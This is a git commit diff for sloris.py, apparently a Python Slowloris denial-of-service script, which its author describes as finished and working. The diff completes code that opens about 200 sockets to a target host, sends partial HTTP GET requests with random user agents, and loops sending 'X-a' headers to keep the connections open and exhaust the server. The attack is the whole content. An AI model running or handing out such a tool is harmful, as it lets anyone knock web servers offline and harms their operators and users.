729f36abd7828d9e2a088bae90dc66d4f324370e
prairir <me@ryanprairie.com>
2019-12-30 23:59:13 -0500

    finished, tested, commented, it works

--- sloris.py
+++ sloris.py
@@ -8,12 +8,14 @@ from time import sleep
 #arg parse stuff
 argparser = argparse.ArgumentParser(prog="sloris", description="Slow Loris Attack Script")
 
-argparser.add_argument("domain", nargs="*", type=str, help="Host")
+argparser.add_argument("domain", nargs="?", type=str, help="Host")
 
-#default 0 so the os picks the port
+#default for http is 80
 argparser.add_argument("-p", "--port", type=int, default=8080, help="Port")
 
 argparser.add_argument("-a", "--alivetime", type=int, default=4, help="Keep Alive Time")
+
+argparser.add_argument("-t", "--sleeptime", type=int, default=1, help="Time to sleep")
 
 argparser.add_argument("-s", "--socket", type=int, default=200, help="# of sockets")
 
@@ -26,7 +28,7 @@ if len(sys.argv) <= 1:
 
 #if no domain then poop pants
 if not parser.domain:
-    print("need to specify a host")
+    print("Need To Specify A Host")
     argparser.print_help()
     sys.exit(1)
 
@@ -55,60 +57,63 @@ def main():
     slist = []
 
     #initializes the list
-    print("Socket Initialization")
+    print("Socket Initialization\nThere Are {} Sockets".format(parser.socket))
     for i in range(parser.socket):
-        slist.append(slsock(domain, extension))
+        slist.append(slsock(domain))
 
     #actual keep alive list
-    print("Sending Keep Alives")
+    print("Sending Keep Alives\nThere Are {} Sockets".format(len(slist)))
     while True:
         try:
-            for s in slsock:
+            for s in slist:
                 try:
                     s.keepAlive()
 
-                except:
+                except socket.error as e:
+                    print("Error {}".format(e))
                     s.close()
-                    slsock.remove(s)
+                    slist.remove(s)
 
                     print("Recreating Pooped Socket")
                     slist.append(slsock(domain, extension))
 
-
         except KeyboardInterrupt:
-            print("Quiting Slow Loris")
+            print("\nQuiting Slow Loris")
             print("Thank You, Bye")
+            break
+
+        sleep(parser.sleeptime)
 
 
 #decided to use a socket object in the long run because it makes it cleaner and more extendable
 class slsock(object):
     #init and send for each socket
-    def __init__(self, domain, extension):
-        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        #set the time out time default 4
-        self.sock.settimeout(parser.alivetime)
+    def __init__(self, domain):
+        try:
+            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-        #no bind because you dont want the os to get confused
-        self.sock.connect((domain, parser.port))
+            #set the time out time default 5
+            self.sock.settimeout(parser.alivetime)
 
-        #because of the splitting the extension will always be there
-        #first line of the get request
-        self.sock.send("GET {} HTTP/1.1\r\n".format(extension).encode("UTF-8"))
+            #no bind because you dont want the os to get confused
+            self.sock.connect((domain, int(parser.port)))
 
-        #the host line
-        self.sock.send("Host: {}\r\n".format(domain).encode("UTF-8"))
+            #sending the get request
+            self.sock.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0,1000)).encode("UTF-8"))
 
-        #the user agent line
-        #picks a random user agent and then puts it in
-        self.sock.send("User-Agent: {}\r\n".format(random_line("useragents")).encode("UTF-8"))
-            
-        #accepted langs line
-        self.sock.send("Accept-language: en-US, en\r\n".encode("UTF-8"))
+            #the user agent line
+            #picks a random user agent and then puts it in
+            self.sock.send("User-Agent: {}\r\n".format(random_line("useragents")).encode("UTF-8"))
+
+            #accepted langs line
+            self.sock.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("UTF-8"))
+        except socket.error as e:
+            print("Init Error: ", e)
 
     #sending the keep alives
     def keepAlive(self):
-        #the line to first send the keep alive with a random time amount
-        self.sock.send("X-a {}\r\n".format(random.randint(1,5000)).encode("UTF-8"))
+        #sends the keep alive header for random amount of time
+        self.sock.send("X-a: {}\r\n".format(random.randint(1,5000)).encode("UTF-8"))
 
     #closes the socket
     def close(self):
